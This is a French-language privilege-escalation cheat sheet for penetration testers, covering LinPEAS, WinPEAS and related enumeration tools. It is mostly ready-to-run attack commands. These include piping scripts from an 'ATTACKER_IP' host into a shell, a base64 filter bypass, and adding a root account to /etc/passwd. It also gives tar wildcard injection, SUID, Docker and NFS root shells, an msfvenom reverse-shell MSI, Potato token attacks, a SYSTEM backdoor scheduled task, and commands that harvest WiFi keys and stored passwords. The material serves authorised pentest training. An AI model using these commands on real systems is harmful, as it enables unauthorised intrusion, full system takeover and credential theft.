# 🔍 LinPEAS & WinPEAS - Guide Complet

Guide exhaustif pour l'énumération et l'escalade de privilèges avec PEAS.

---

## 📖 Concepts de Base

### Qu'est-ce que PEAS ?

**PEAS** (Privilege Escalation Awesome Scripts) sont des outils d'énumération automatisée pour trouver des vecteurs d'escalade de privilèges.

- **LinPEAS** : Linux/Unix
- **WinPEAS** : Windows

**Repository** : https://github.com/carlospolop/PEASS-ng

---

## 1️⃣ LinPEAS

### Téléchargement et exécution

```bash
# Télécharger
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Exécution
chmod +x linpeas.sh
./linpeas.sh

# Sans écrire sur le disque
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Depuis un serveur web local
curl http://ATTACKER_IP/linpeas.sh | sh

# Via base64 (bypass filtres)
cat linpeas.sh | base64 -w0 > linpeas.b64
# Sur la cible:
echo "BASE64_CONTENT" | base64 -d | sh
```

### Options de LinPEAS

```bash
# Aide
./linpeas.sh -h

# Mode silencieux (pas de bannière)
./linpeas.sh -q

# Exécution rapide (skip certains checks longs)
./linpeas.sh -s

# Recherche de mots-clés spécifiques
./linpeas.sh -a  # Tout (le plus complet)

# Exporter en fichier
./linpeas.sh > linpeas_output.txt
./linpeas.sh | tee linpeas_output.txt

# Sans couleurs (pour logs)
./linpeas.sh -N > linpeas_output.txt

# Mode debug
./linpeas.sh -d
```

### Sections de LinPEAS

```
[+] System Information
    - OS version, kernel
    - Hostname, architecture
    
[+] Available Software
    - Versions installées
    - CVEs potentiels
    
[+] Processes, Crons, Services
    - Services root exploitables
    - Crons avec permissions faibles
    
[+] Network
    - Ports ouverts
    - Services internes
    
[+] Users
    - Utilisateurs avec shell
    - Dernières connexions
    - Sudo rules
    
[+] Interesting Files
    - SUID/SGID binaires
    - Capabilities
    - Fichiers world-writable
    
[+] Passwords/Keys
    - SSH keys
    - Mots de passe dans fichiers
    - Credentials hardcodés
```

### Interprétation des couleurs

```
🔴 RED/YELLOW     = 95% chance de PE vector
🟡 RED            = Vecteur d'élévation
🟢 LightCyan      = Users avec console
🔵 Blue           = Users sans console
💚 Green          = Fichiers intéressants
💜 LightMagenta   = Information critique
```

### Checks importants à surveiller

```bash
# SUID exploitables
find / -perm -4000 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Sudo permissions
sudo -l

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Writable PATH directories
echo $PATH

# Passwords dans fichiers
grep -r "password" /etc 2>/dev/null
grep -r "password" /home 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Docker/LXC
id | grep docker
ls -la /var/run/docker.sock
```

---

## 2️⃣ WinPEAS

### Téléchargement et exécution

```powershell
# Télécharger l'exécutable
# https://github.com/carlospolop/PEASS-ng/releases

# Exécution
.\winPEAS.exe

# Depuis URL
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# CMD
certutil -urlcache -f http://ATTACKER_IP/winPEAS.exe winPEAS.exe
.\winPEAS.exe

# PowerShell download
Invoke-WebRequest -Uri "http://ATTACKER_IP/winPEAS.exe" -OutFile "winPEAS.exe"
```

### Options de WinPEAS

```cmd
# Aide
winPEAS.exe -h

# Toutes les vérifications
winPEAS.exe all

# Sections spécifiques
winPEAS.exe systeminfo
winPEAS.exe userinfo
winPEAS.exe processinfo
winPEAS.exe servicesinfo
winPEAS.exe applicationsinfo
winPEAS.exe networkinfo
winPEAS.exe windowscreds
winPEAS.exe browserinfo
winPEAS.exe filesinfo
winPEAS.exe eventsinfo

# Silencieux
winPEAS.exe quiet

# Sans couleurs
winPEAS.exe notcolor

# Recherche de mots spécifiques
winPEAS.exe searchpf "password"

# Log file
winPEAS.exe log=output.txt
```

### Sections de WinPEAS

```
[+] System Information
    - OS version, hotfixes
    - Architecture
    - Antivirus
    
[+] User Information
    - Current user privileges
    - Groups
    - Logged users
    
[+] Processes Information
    - Processes avec droits élevés
    - Processes vulnérables
    
[+] Services Information
    - Services avec permissions faibles
    - Unquoted paths
    - Modifiable services
    
[+] Applications
    - Software installé
    - Versions vulnérables
    
[+] Network Information
    - Ports ouverts
    - Connections
    - Shares
    
[+] Windows Credentials
    - Cached credentials
    - Vault
    - DPAPI
    
[+] Browser Information
    - Saved passwords
    - History
    - Cookies
    
[+] Interesting Files
    - Fichiers sensibles
    - SAM/SYSTEM backups
    - Unattend.xml
```

### Checks critiques WinPEAS

```cmd
# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Unquoted Service Paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Modifiable Services
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Token Privileges
whoami /priv

# Autologon Credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# SAM/SYSTEM backups
dir C:\Windows\Repair\SAM
dir C:\Windows\System32\config\RegBack\

# Unattend.xml
dir C:\Windows\Panther\Unattend.xml
dir C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\Panther\Unattend.xml | findstr /i password

# Saved credentials
cmdkey /list

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="WIFI_NAME" key=clear
```

---

## 3️⃣ Vecteurs d'Élévation Courants

### Linux

```bash
# Kernel Exploits
uname -r
searchsploit linux kernel 5.4

# SUID Binaries
# Vérifier sur GTFOBins
find / -perm -4000 2>/dev/null
# Ex: /usr/bin/find avec SUID
find . -exec /bin/sh -p \; -quit

# Capabilities
# Ex: python3 avec cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Sudo misconfig
sudo -l
# Ex: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'

# Writable /etc/passwd
echo 'root2:$1$salt$password:0:0:root:/root:/bin/bash' >> /etc/passwd

# Cron avec wildcard
# Si cron exécute: tar -cf /backup/* 
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# Docker privilege
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# NFS no_root_squash
# Sur attaquant:
mkdir /tmp/mount
mount -t nfs TARGET:/shared /tmp/mount
cp /bin/bash /tmp/mount/
chmod +s /tmp/mount/bash
# Sur cible:
/shared/bash -p
```

### Windows

```cmd
# Unquoted Service Path
# Service: C:\Program Files\My App\service.exe
# Créer: C:\Program.exe (malveillant)

# Weak Service Permissions
# Si on peut modifier le binpath
sc config VulnService binpath= "C:\temp\shell.exe"
sc stop VulnService
sc start VulnService

# AlwaysInstallElevated
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i shell.msi

# Token Impersonation (SeImpersonatePrivilege)
# Potato attacks
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"

# DLL Hijacking
# Trouver un service qui charge une DLL manquante
# Placer notre DLL malveillante dans le path

# Scheduled Tasks
schtasks /query /fo LIST /v
# Si writable:
schtasks /create /tn "Backdoor" /tr "C:\temp\shell.exe" /sc onstart /ru SYSTEM

# Registry Autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Si writable, ajouter notre payload
```

---

## 4️⃣ Scripts Complémentaires

### Linux

```bash
# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t

# Linux Smart Enumeration (lse)
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh
./lse.sh -l 1

# linux-exploit-suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# pspy (process spy)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

### Windows

```powershell
# PowerUp
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks

# Seatbelt
Seatbelt.exe -group=all

# SharpUp
SharpUp.exe audit

# Watson (vulnerability finder)
Watson.exe

# Windows Exploit Suggester
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt
```

---

## 5️⃣ Cheatsheet Rapide

```bash
# === LINPEAS ===
# Télécharger et exécuter
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Silencieux avec output
./linpeas.sh -q > output.txt

# Rapide
./linpeas.sh -s

# === WINPEAS ===
# Exécuter
.\winPEAS.exe all

# Section spécifique
.\winPEAS.exe servicesinfo

# Sans couleurs
.\winPEAS.exe notcolor log=output.txt

# === VECTEURS LINUX ===
sudo -l                           # Sudo rules
find / -perm -4000 2>/dev/null    # SUID
getcap -r / 2>/dev/null           # Capabilities
cat /etc/crontab                  # Crons
ls -la /etc/passwd                # Writable?
docker images                     # Docker?

# === VECTEURS WINDOWS ===
whoami /priv                      # Token privileges
reg query HKLM\..\Winlogon        # Autologon
cmdkey /list                      # Saved creds
wmic service get name,pathname    # Unquoted paths
sc qc ServiceName                 # Service config
schtasks /query /fo LIST /v       # Scheduled tasks
```

---

## 📚 Ressources

- **PEASS-ng** : https://github.com/carlospolop/PEASS-ng
- **GTFOBins** : https://gtfobins.github.io/
- **LOLBAS** : https://lolbas-project.github.io/
- **HackTricks Linux PE** : https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- **HackTricks Windows PE** : https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/

---

**Tags:** `#linpeas #winpeas #enumeration #privilege-escalation #linux #windows #suid #services`
